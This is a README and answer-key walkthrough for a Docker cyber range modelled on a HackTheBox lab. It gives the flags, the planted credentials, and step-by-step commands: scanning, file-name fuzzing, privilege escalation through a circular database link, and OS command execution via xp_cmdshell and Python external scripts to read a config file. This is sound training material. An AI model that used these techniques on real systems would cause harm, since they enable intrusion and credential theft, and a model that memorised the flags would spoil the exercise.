# P.O.O. Cyber Range

A Docker-based cyber range inspired by HackTheBox's "P.O.O." (Professional Offensive Operations) machine. This Linux version recreates the same attack paths without requiring Windows/Active Directory.

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    POO-NETWORK (10.13.38.0/24)                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐      │
│  │  Attacker    │    │  Web Server  │    │  Database    │      │
│  │ 10.13.38.5   │───▶│ 10.13.38.11  │───▶│ 10.13.38.12  │      │
│  │              │    │   Port 80    │    │  Port 5432   │      │
│  └──────────────┘    └──────────────┘    └──────────────┘      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## Quick Start

```bash
 cd /Users/mariasanzgomez/Documents/cai_v0.4.0/cai/cyber-ranges/poo-range/
# Start the range
./start_range.sh

# Access attacker container
docker exec -it poo-attacker /bin/bash

# Stop the range
./stop_range.sh
```

## Attack Path

### Phase 1: Web Enumeration
1. Scan web server at 10.13.38.11
2. Discover `.DS_Store` file leak
3. Parse to find hidden directories: `/admin`, `/dev`

### Phase 2: IIS Shortname Enumeration (Simulated)
1. Use IIS shortname scanner to probe `/dev/.../db/` directory
2. Discover file prefix `poo_co~1` through different HTTP response codes
3. Use wfuzz to fuzz full filename: `poo_connection.txt`

### Phase 3: Information Disclosure
1. Access `/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt`
2. Obtain database credentials:
   - Server: 10.13.38.12
   - User: external_user
   - Password: #p00Public3xt3rnalUs3r#
   - **Flag 1**: POO{fcfb0767f5bd3cbc22f40ff5011ad555}

### Phase 4: Database Privilege Escalation
1. Connect to PostgreSQL as external_user
2. Enumerate Foreign Data Wrappers (linked servers)
3. Discover circular link: POO_PUBLIC → POO_CONFIG → POO_PUBLIC (as postgres)
4. Exploit circular link to execute queries as superuser
5. Read flag database: **Flag 2**: POO{88d829eb39f2d11697e689d779810d42}

### Phase 5: Command Execution via xp_cmdshell
1. Use xp_cmdshell for OS command execution
2. Execute whoami - running as postgres (service account)
3. Try to read web.config - Permission denied (service account restricted)

### Phase 6: sp_execute_external_script Exploitation (Final)
1. Use sp_execute_external_script to run Python scripts
2. Discover it runs as poo_public01 (different security context!)
3. Read /var/www/html/web.config as poo_public01
4. Obtain admin credentials: Administrator / EverybodyWantsToWorkAtP.O.O.
5. Login to /admin panel
6. **Flag 3 (FINAL)**: POO{4882bd2ccfd4b5318978540d9843729f}

## Credentials Summary

| User | Password | Location |
|------|----------|----------|
| external_user | #p00Public3xt3rnalUs3r# | PostgreSQL (poo_public) |
| internal_user | internal_secret_pass! | PostgreSQL (poo_config) |
| postgres | SuperSecretDBRoot! | PostgreSQL (superuser) |
| Administrator | EverybodyWantsToWorkAtP.O.O. | Web Admin |

## Flags

| # | Flag | Location |
|---|------|----------|
| 1 | POO{fcfb0767f5bd3cbc22f40ff5011ad555} | /dev/.../poo_connection.txt |
| 2 | POO{88d829eb39f2d11697e689d779810d42} | Database 'flag' table |
| 3 | POO{4882bd2ccfd4b5318978540d9843729f} | /admin page (FINAL) |

## Walkthrough - Step by Step Commands

### Step 1: Initial Reconnaissance

```bash
# From attacker container
docker exec -it poo-attacker /bin/bash

# Scan the network
nmap -sV -sC 10.13.38.11-13

# Scan web server specifically
nmap -p- --min-rate=1000 10.13.38.11
```

### Step 2: Web Enumeration - Find .DS_Store

```bash
# Use DS_Walk to discover and parse .DS_Store files recursively
# https://github.com/Keramas/DS_Walk
python3 /tools/DS_Walk/ds_walk.py -u http://10.13.38.11
```

**Output:**
```
[!] .ds_store file is present on the webserver.
[+] Enumerating directories based on .ds_server file:
[!] http://10.13.38.11/admin
[!] http://10.13.38.11/dev
[!] http://10.13.38.11/Images
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
```

**Key discovery:** Hidden directory `/dev/304c0c90fbc6520610abbf378e2339d1/db`

### Step 3: IIS Shortname Enumeration with Metasploit

The `/dev/.../db` folder contains an interesting file. The tilde (~) character can be used to enumerate files and folders on IIS, discovering the first six characters of files and folders along with their extension.

Let's use the Metasploit module to enumerate the server:

```bash
# Launch Metasploit
msfconsole

# Use the IIS shortname scanner module
msf6 > use auxiliary/scanner/http/iis_shortname_scanner

# Set the target
msf6 auxiliary(scanner/http/iis_shortname_scanner) > set RHOSTS 10.13.38.11

# Set the path to scan (the db folder we discovered)
msf6 auxiliary(scanner/http/iis_shortname_scanner) > set PATH /dev/304c0c90fbc6520610abbf378e2339d1/db/

# Run the scanner
msf6 auxiliary(scanner/http/iis_shortname_scanner) > run
```

**Output:**
```
[*] 10.13.38.11:80 - Scanning for shortnames...
[+] 10.13.38.11:80 - Found file: POO_CO~1.TXT
[*] 10.13.38.11:80 - Scan completed. Found 1 file(s).
[*] Auxiliary module execution completed
```

**Key finding:** A file starting with `POO_CO` with extension `.TXT` exists in the db folder (shortname: `POO_CO~1.TXT`)

### Step 4: Fuzz for Full Filename with wfuzz

```bash
# Use wfuzz to discover the full filename
# We know it starts with "poo_co" from the shortname scan
wfuzz -c -w /tools/poo_wordlist.txt --hc 404,403 \
    http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/FUZZ
```

**Output:**
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000003:   200        8 L      12 W       165 Ch      "poo_connection.txt"

Total time: 0.5s
Processed Requests: 35
Filtered Requests: 34
```

**Found:** `poo_connection.txt`

### Step 5: Access Database Credentials (Flag 1)

```bash
# Now that we know the full filename, access it
curl http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt
```

**Output:**
```
SERVER=10.13.38.12
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#

Flag : POO{fcfb0767f5bd3cbc22f40ff5011ad555}
```

### Step 6: Connect to Database

```bash
# Connect to PostgreSQL (similar to connecting to MS SQL Server)
PGPASSWORD='#p00Public3xt3rnalUs3r#' psql -h 10.13.38.12 -U external_user -d poo_public
```

### Step 7: Check for Sysadmin Privileges

Now that we have credentials for the POO_PUBLIC database, let's check if the user has sysadmin privileges. This can be done by querying the syslogins table:

```sql
-- Check current user
SELECT current_user;
-- Returns: external_user

-- Query syslogins to check privileges (similar to SQL Server master.dbo.syslogins)
SELECT name, sysadmin FROM syslogins;
```

**Output:**
```
     name      | sysadmin
---------------+----------
 postgres      |        1
 external_user |        0
 internal_user |        0
```

The database has three users: `postgres` (sa equivalent), `external_user`, and `internal_user`. The current user doesn't have sysadmin privileges (sysadmin=0), which means we can't execute OS commands directly.

### Step 8: Enumerate Linked Servers

PostgreSQL (like SQL Server) provides the ability to link external resources. This is common in domain environments and can be exploited in case of misconfigurations. Let's check if there are any linked servers by querying the sysservers table:

```sql
-- Query sysservers to find linked servers (similar to SQL Server master.dbo.sysservers)
SELECT srvname, providername, datasource FROM sysservers;
```

**Output:**
```
  srvname   | providername | datasource
------------+--------------+------------
 POO_PUBLIC | postgres_fdw | localhost
 POO_CONFIG | postgres_fdw | poo_config
```

We found a linked server called **POO_CONFIG**! Let's try to execute queries on this linked server.

### Step 9: Query the Linked Server

```sql
-- Execute a query on the linked server POO_CONFIG
-- Check what user we connect as
SELECT * FROM exec_on_config('SELECT current_user');
```

**Output:** `internal_user`

We are connecting to POO_CONFIG as `internal_user`. Let's check what linked servers exist on POO_CONFIG:

```sql
-- Check for linked servers on POO_CONFIG
SELECT * FROM exec_on_config('SELECT srvname FROM sysservers');
```

**Output:**
```
   result
------------
 POO_CONFIG
 POO_PUBLIC
```

**Interesting!** POO_CONFIG has a link to POO_PUBLIC. But wait - we came FROM POO_PUBLIC! This is a **circular link**!

### Step 10: Exploit Circular Link for Privilege Escalation

Let's check what user POO_CONFIG uses to connect back to POO_PUBLIC:

```sql
-- Execute through the circular link and check the user
SELECT * FROM exec_on_config('SELECT srvname FROM sysservers');
```

**Output:** `postgres`

**CRITICAL FINDING:** The circular link connects back to POO_PUBLIC as `postgres` (sysadmin)! This is a major misconfiguration that allows privilege escalation.

### Step 11: Read Flag from Database (Flag 2)

Now we can execute queries as the superuser. Let's read the flag database:

```sql
-- List all databases as postgres
SELECT * FROM exec_on_config('SELECT * FROM exec_on_public_as_sa(''SELECT datname FROM pg_database'')');

-- Read the flag table from the flag database
SELECT * FROM exec_on_config('SELECT * FROM exec_on_public_as_sa(''SELECT * FROM dblink(''''dbname=flag'''', ''''SELECT * FROM flag'''') AS t(flag TEXT)'')');
```

**Output:** `POO{88d829eb39f2d11697e689d779810d42}`

### Step 12: Command Execution with xp_cmdshell

The database has `xp_cmdshell` which allows OS command execution. Let's try to execute system commands:

```sql
-- Execute whoami to see current user context
SELECT * FROM xp_cmdshell('whoami');
```

**Output:**
```
 output
----------
 postgres
```

The SQL Server service is running as the `postgres` service account. The web.config file should contain credentials to login to the admin panel. Let's try to read it:

```sql
-- Try to read web.config as service account
SELECT * FROM xp_cmdshell('cat /var/www/html/web.config');
```

**Output:**
```
 output
-----------------------------------------
 cat: /var/www/html/web.config: Permission denied
```

We're denied access! The service account doesn't have permission to read the web.config file. We need to find a different method to obtain command execution.

### Step 13: Use sp_execute_external_script for Different Context

Looking at SQL Server features, we find `sp_execute_external_script` which allows execution of external scripts in R or Python. This procedure runs scripts in a separate process with potentially different permissions.

```sql
-- Execute Python script and check user context
SELECT * FROM sp_execute_external_script('Python', 'import os; print(os.popen("whoami").read())');
```

**Output:**
```
 output
--------------
 poo_public01
```

This time we're running as `poo_public01` - not the service account! The external script launcher runs in a different security context. Let's try to read the web.config:

```sql
-- Read web.config using sp_execute_external_script
SELECT * FROM sp_execute_external_script('Python', '
with open("/var/www/html/web.config", "r") as f:
    for line in f:
        print(line.strip())
');
```

**Output:**
```
 output
---------------------------------------------------------
 <?xml version="1.0" encoding="utf-8"?>
 <!--
   IIS Web.config - P.O.O. Intranet Configuration
   This file contains sensitive configuration for the admin panel
 -->
 <configuration>
   ...
     <!-- Admin Panel Credentials -->
     <add key="AdminUsername" value="Administrator" />
     <add key="AdminPassword" value="EverybodyWantsToWorkAtP.O.O." />
   ...
 </configuration>
```

We're now able to read the web.config and obtain the login password for the local Administrator: `EverybodyWantsToWorkAtP.O.O.`

### Step 14: Verify Admin Credentials from Config Table

```sql
-- Read the config table on POO_CONFIG to confirm admin user
SELECT * FROM exec_on_config('SELECT key || '': '' || value FROM config');
```

**Output:**
```
                       result
-----------------------------------------------------
 db_version: 14.0
 admin_email: admin@intranet.poo
 admin_user: Administrator
 admin_password_hint: Check IIS web.config file at /var/www/html/web.config
```

**Discovered credentials:**
- Web Admin: `Administrator` / `EverybodyWantsToWorkAtP.O.O.` (from web.config)

### Step 15: Access Web Admin Panel (Flag 3 - FINAL)

```bash
# Login to admin panel with discovered credentials
curl -u Administrator:EverybodyWantsToWorkAtP.O.O. http://10.13.38.11/admin/

# Or open in browser: http://10.13.38.11/admin/
# Username: Administrator
# Password: EverybodyWantsToWorkAtP.O.O.
```

**Flag 3 (FINAL):** `POO{4882bd2ccfd4b5318978540d9843729f}`

---

## All Flags Summary

| # | Flag | How to Get |
|---|------|------------|
| 1 | `POO{fcfb0767f5bd3cbc22f40ff5011ad555}` | `curl http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt` |
| 2 | `POO{88d829eb39f2d11697e689d779810d42}` | SQL: Read flag database via circular FDW link |
| 3 | `POO{4882bd2ccfd4b5318978540d9843729f}` | Login to `/admin` with Administrator:EverybodyWantsToWorkAtP.O.O. (FINAL) |
